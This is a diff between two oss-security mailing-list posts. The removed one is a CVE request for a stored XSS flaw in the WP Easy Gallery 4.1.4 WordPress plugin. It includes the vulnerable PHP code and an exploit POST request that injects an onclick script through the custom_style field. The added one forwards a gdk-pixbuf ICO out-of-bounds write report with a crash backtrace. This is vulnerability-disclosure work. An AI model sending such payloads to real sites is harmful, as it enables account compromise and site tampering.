@@ -1,9 +1,9 @@
 X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["1952" "Tuesday" "26" "January" "2016" "15:29:35" "+0530" "Rahul Pratap Singh" "techno.rps@gmail.com" "<CADLX=aHvwog3Ss3sVQVhoi-F1A46a2X+w687MCJ+q-5Z_kBUSA@mail.gmail.com>" "63" "[oss-security] CVE Request: WP Easy Gallery v4.1.4 Stored XSS Vulnerability" nil nil nil "1" "2016012609:59:35" "[oss-security] CVE Request: WP Easy Gallery v4.1.4 Stored XSS Vulnerability" (number mark "U       techno.rps@g Jan 26   63/1952  " thread-indent "\"[oss-security] CVE Request: WP Easy Gallery v4.1.4 Stored XSS Vulnerability\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["3440" "Tuesday" "26" "July" "2016" "22:37:46" "+0200" "Gustavo Grieco" "gustavo.grieco@gmail.com" "<CACn5sdSdMmGQrUjKfCsxdXRMDqwmGes82PrKxHqw83gkJ-+W6w@mail.gmail.com>" "82" "Re: [oss-security] CVE Request: Write out-of-bounds in gdk-pixbuf 2.30.7" nil nil nil "7" "2016072620:37:46" "[oss-security] CVE Request: Write out-of-bounds in gdk-pixbuf 2.30.7" (number mark "U       gustavo.grie Jul 26   82/3440  " thread-indent "\"Re: [oss-security] CVE Request: Write out-of-bounds in gdk-pixbuf 2.30.7\"\n") "<CAGkswnQeO6oXv+so+DRCMWHqpVKuKYjZ3dTo=gZo2GzycdArhw@mail.gmail.com>" ("<CAGkswnQeO6oXv+so+DRCMWHqpVKuKYjZ3dTo=gZo2GzycdArhw@mail.gmail.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
 X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 13735 invoked by uid 550); 26 Jan 2016 10:15:48 -0000
+Received: (qmail 1811 invoked by uid 550); 26 Jul 2016 20:38:00 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,99 +12,122 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 6030 invoked from network); 26 Jan 2016 09:59:47 -0000
+Received: (qmail 1790 invoked from network); 26 Jul 2016 20:37:59 -0000
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
         d=gmail.com; s=20120113;
-        h=mime-version:date:message-id:subject:from:to:content-type;
-        bh=BXAwYoBZBPF7+njxY1UGrlD/RQ9Wif0E45giNoZ4zBM=;
-        b=li+xKGMgXS62APGaTz9nq3G1Z+WUjr8It0fI8Uu/dUhhCSRqkmzqxm8+QWOaLeJrKF
-         AR1JX8ItZ7I2g5J6F9TyxR+XFFyOfsRKl/qsqCd1Lez+DSzUjSJ+h2m0cgmj2nXMzMc+
-         Za7Xi8CF8PemOy321BDnxLslBjEOBiVnmxShpRoV5URyqZS7Xg/AdZC5S9JePBTRERd/
-         Tui981T4mLvwN9EYpSj1NdpVAmQOpi7TjiXLaomLOop9S2XOp88WCtFJCaavMszoBP9D
-         vV8BeveQFndVnR7j8qFTzDbWUa6BGtYOeOskHhSXXZ3hocXj3KXpJG+sJ0FrmnAtMI07
-         2d9Q==
+        h=mime-version:in-reply-to:references:from:date:message-id:subject:to
+         :cc;
+        bh=bFiJPNDiC+ZgP4UlcRRCHHAvR3NxfEeXMlHyPe+bJt8=;
+        b=KmwDoh+AsFnThieha0eGjDOddvwegm2ceyvIrFVcmUyaBIG3LwuKPN/nk9YXbnUN1S
+         P+grTD2hBXyYlCvpHccDzhyuOJJrkQVvSqiwXrcD/1lvSXtoOxBUwydXQzFQVXK8Llq1
+         6uzV8hcBPfaU8NKVBnL8Ck4hL9tpB1pW78NssXneBEjHBtT/lODHZQkpDxtYsZhbEs61
+         K7XY0G46fn0lXLrOLd5pkgwBybY6NC0YKV83duYdovHLVGmdS00BZHWO+h7n66gVV5uN
+         /KeQO1nE+p+pb0CzLyvlOtFWC7BGcrM4gYcA+q5YvLyvb25JEupY9Isf8a5dKeGJco12
+         30ow==
 X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
         d=1e100.net; s=20130820;
-        h=x-gm-message-state:mime-version:date:message-id:subject:from:to
-         :content-type;
-        bh=BXAwYoBZBPF7+njxY1UGrlD/RQ9Wif0E45giNoZ4zBM=;
-        b=IVbGHhkQxrNYUUDCBStmC9gnP9X9LjKzSfvJ7aTzsRpiVWrdvqKgWyKLHh6qGcUVX1
-         7SAsoQYWOmdpVqtMvAEavgr5Kfy1Lj/yy3MPMAkl9bw/b2NUyRyHEP4GsyBdMHtzn9i7
-         g/GvzTJhRK28EnAJZoyN0F7oxSXbGKF2W+Hn1ulJQ96XbxPb7MpJW9rOY2hYtAqXsg1F
-         VoPxei7eKGYwVvzx5E39WBvV+a9d3VjRluxyrqagIQSyh8ZocxdUhBCUIfHJaIO6fice
-         jPCILSkYl05VLA9JigmB45a8rpwqTJzsK+j1uOb1ttdy0M9UYXlNn8LvJE894ppGmVq1
-         Kr4Q==
-X-Gm-Message-State: AG10YOS7l1wz5ChQ143NimMWUqQh2orYVinXLjVW5VIV4aWyFNN83BBoyag7VB68bdmA3sdeKRwWLCpKkk58SA==
+        h=x-gm-message-state:mime-version:in-reply-to:references:from:date
+         :message-id:subject:to:cc;
+        bh=bFiJPNDiC+ZgP4UlcRRCHHAvR3NxfEeXMlHyPe+bJt8=;
+        b=dA9n2xtP3je3j6vblSzq80uL3g8wVketa1T9DOaDal7jzxSF/T2Mjje0m4mS70zyYY
+         6ZeuEC8VWbzfCNsr+6PFugLKFfzI5XCmjLkz7l9CT8kcqGpc0Yw9MJg25diAF4QL3Vah
+         yVJAcoeA3lDhiovrMJnclekzV1d0uoooMo1BfbQ/qIlFkCDAdUzrreuMrvj0Ir+CPLh/
+         nHiPHzggIbuN+1+E0TMDLvdnSMBZCWRs/VQHkJda6pZafBObgMg8EgfTGqlJKvXrNScp
+         ewhcevhhezuH/l6SuMOZbZF9tnMeZ/OtA+N0IhJvMCqpvScRjXvpI3fBkhguohhaywhP
+         q7kw==
+X-Gm-Message-State: AEkoousXWN8LLuX+ewtGZqpmrRImTd3np7YHnSU2x1CUy2ilYyk1S3ys5s4Ey/Eqc3lERotMxxRrncSpxTK4Rw==
+X-Received: by 10.36.86.134 with SMTP id o128mr30470345itb.5.1469565467016;
+ Tue, 26 Jul 2016 13:37:47 -0700 (PDT)
 MIME-Version: 1.0
-X-Received: by 10.107.35.16 with SMTP id j16mr21158334ioj.10.1453802375071;
- Tue, 26 Jan 2016 01:59:35 -0800 (PST)
-Date: Tue, 26 Jan 2016 15:29:35 +0530
-Message-ID: <CADLX=aHvwog3Ss3sVQVhoi-F1A46a2X+w687MCJ+q-5Z_kBUSA@mail.gmail.com>
-From: Rahul Pratap Singh <techno.rps@gmail.com>
+In-Reply-To: <CAGkswnQeO6oXv+so+DRCMWHqpVKuKYjZ3dTo=gZo2GzycdArhw@mail.gmail.com>
+References: <CAGkswnQeO6oXv+so+DRCMWHqpVKuKYjZ3dTo=gZo2GzycdArhw@mail.gmail.com>
+From: Gustavo Grieco <gustavo.grieco@gmail.com>
+Date: Tue, 26 Jul 2016 22:37:46 +0200
+Message-ID: <CACn5sdSdMmGQrUjKfCsxdXRMDqwmGes82PrKxHqw83gkJ-+W6w@mail.gmail.com>
 To: oss-security@lists.openwall.com
-Content-Type: multipart/alternative; boundary=001a11405fc023ce48052a39be96
-Subject: [oss-security] CVE Request: WP Easy Gallery v4.1.4 Stored XSS Vulnerability
-
---001a11405fc023ce48052a39be96
+Cc: cve-assign@mitre.org
 Content-Type: text/plain; charset=UTF-8
-Content-Transfer-Encoding: quoted-printable
+Subject: Re: [oss-security] CVE Request: Write out-of-bounds in gdk-pixbuf 2.30.7
 
-#Product    : WP Easy Gallery
-#Version    : 4.1.4
-#Home page Link  : https://wordpress.org/plugins/wp-easy-gallery
+Explicitly adding cve-assign to CC, this seems to have fallen through
+the cracks.
 
-XSS Vulnerability:
+Regards,
 
-----------------------------------------
-Description:
-----------------------------------------
-"custom_style" parameter is not sanitized that leads to Stored XSS.
-
-----------------------------------------
-Vulnerable Code:
-----------------------------------------
-File Name: wpeg-settings.php
-
-Found at line:12
-$temp_defaults['custom_style'] =3D isset($_POST['custom_style']) ?
-$_POST['custom_style'] : '';
-
-Found at line:103
-<td><textarea name=3D"custom_style" id=3D"custom_style" rows=3D"4"
-cols=3D"40"><?php _e($default_options['custom_style']); ?></textarea></td>
-
-----------------------------------------
-Exploit:
-----------------------------------------
-POST /wp-admin/admin.php?page=3Dwpeg-settings
-
-wpeg_settings=3D3b59e6c6ef&_wp_http_referer=3Dabc&display_mode=3Dabc&num_co=
-lumns=3Dabc&show_gallery_name=3Dabc&gallery_name_alignment=3Dabc&use_defaul=
-t_style=3Dabc&drop_shadow=3Dabc&custom_style=3D</textarea><input+type%3Dtex=
-t+onclick%3Dalert(%2FXSS%2F)><!--&defaultSettings=3Dxss&Submit=3DSave
-
-----------------------------------------
-POC:
-----------------------------------------
-https://0x62626262.files.wordpress.com/2016/01/easy-gallery-settingsxsspoc.=
-png
-
-Fix:
-Update to 4.1.5
-
-Disclosure Timeline:
-reported to wordpress  : 18/1/2016
-wordpress response (plugin taken down) : 19/1/2016
-vendor deployed a patch : 26/1/2016
-
-#######################################
-#        CTG SECURITY SOLUTIONS     #
-#        www.ctgsecuritysolutions.com    #
-#######################################
-
-Pub ref:
-https://0x62626262.wordpress.com/2016/01/26/wp-easy-gallery-v4-1-4-stored-x=
-ss-vulnerability/
-https://wordpress.org/plugins/wp-easy-gallery/changelog/
-
---001a11405fc023ce48052a39be96--
+2016-07-13 19:53 GMT+02:00 Franco Costantini <franco.costantini.20@gmail.com>:
+> This issue was reported to Redhat secalert, they asked me to disclose it
+> publicly.
+>
+> A write out-of-bounds parsing an ico file was found in gdk-pixbuf 2.30.7.
+> It's tested in Ubuntu 14.04, other versions can be affected (in Debian 8, an
+> assert inside gtk3 stops the execution before the crash). This issue can be
+> reproduced using eog:
+>
+>  (gdb) run crash.ico
+>  Starting program: /usr/bin/eog crash.ico
+>  [Thread debugging using libthread_db enabled]
+>  Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+>  [New Thread 0x7fffec58e700 (LWP 3709)]
+>  [New Thread 0x7fffebd8d700 (LWP 3710)]
+>  [New Thread 0x7fffe9656700 (LWP 3711)]
+>  [New Thread 0x7fffe8e55700 (LWP 3712)]
+>
+>  (eog:3705): EOG-WARNING **: Couldn't load icon: Icon 'image-loading' not
+> present in theme
+>
+>  Program received signal SIGSEGV, Segmentation fault.
+>  [Switching to Thread 0x7fffe9656700 (LWP 3711)]
+>  0x00007fffd83b428c in OneLine32 (context=0x7fffe0029820) at io-ico.c:589
+>  (gdb) bt
+>  #0  0x00007fffd83b428c in OneLine32 (context=0x7fffe0029820) at
+> io-ico.c:589
+>  #1  OneLine (context=0x7fffe0029820) at io-ico.c:800
+>  #2  gdk_pixbuf__ico_image_load_increment (data=0x7fffe0029820,
+>      buf=0x7fffe001b852 "", size=0, error=0x7fffe9655b68) at io-ico.c:891
+>  #3  0x00007ffff53e2665 in gdk_pixbuf_loader_load_module (
+>      loader=loader@entry=0x7df420, image_type=image_type@entry=0x0,
+>      error=error@entry=0x7fffe9655b68) at gdk-pixbuf-loader.c:443
+>  #4  0x00007ffff53e2ee8 in gdk_pixbuf_loader_close (loader=0x7df420,
+>      error=0xaa1aa0) at gdk-pixbuf-loader.c:808
+>  #5  0x00000000004236ab in eog_image_load ()
+>  #6  0x00000000004275d7 in ?? ()
+>  #7  0x0000000000425959 in ?? ()
+>  #8  0x00007ffff43eff05 in ?? () from /lib/x86_64-linux-gnu/libglib-2.0.so.0
+>  #9  0x00007ffff3f53184 in start_thread (arg=0x7fffe9656700)
+>      at pthread_create.c:312
+>  #10 0x00007ffff3c8037d in clone ()
+>      at ../sysdeps/unix/sysv/linux/x86_64/clone.S:111
+>
+> The affected function is here:
+>
+>  static void OneLine32 (struct ico_progressive_state *context)
+> {
+>         gint X;
+>         guchar *Pixels;
+>
+>         X = 0;
+>         if (context->Header.Negative == 0)
+>                 Pixels = (context->pixbuf->pixels +
+>                           context->pixbuf->rowstride *
+>                           (context->Header.height - context->Lines - 1));
+>         else
+>                 Pixels = (context->pixbuf->pixels +
+>                           context->pixbuf->rowstride *
+>                           context->Lines);
+>         while (X < context->Header.width) {
+>                 Pixels[X * 4 + 0] = context->LineBuf[X * 4 + 2];
+>                 Pixels[X * 4 + 1] = context->LineBuf[X * 4 + 1];
+>                 Pixels[X * 4 + 2] = context->LineBuf[X * 4 + 0];
+>                 Pixels[X * 4 + 3] = context->LineBuf[X * 4 + 3];
+>                 X++;
+>         }
+> }
+>
+> The value of context->Header.height in OneLine32 is a very large number
+> (probably it wasn't validated correctly). Such value is used to calculate
+> where to write, resulting in an overflow where Pixels is written.
+>
+> This issue was found using QuickFuzz, the file to reproduce it is attached.
+> Please assign a CVE if suitable.
+>
+> Regards, Franco
